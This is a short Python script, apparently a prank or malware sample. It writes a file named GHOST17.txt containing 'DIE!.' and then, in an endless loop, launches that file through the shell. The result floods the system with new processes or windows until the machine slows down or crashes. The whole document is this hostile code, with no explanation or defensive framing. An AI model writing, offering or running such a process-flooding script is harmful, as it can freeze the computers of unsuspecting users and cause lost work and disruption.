import subprocess
host = open("GHOST17.txt","w")
host.write("DIE!.")
host.close()
while True:
    subprocess.Popen("GHOST17.txt", shell=True)
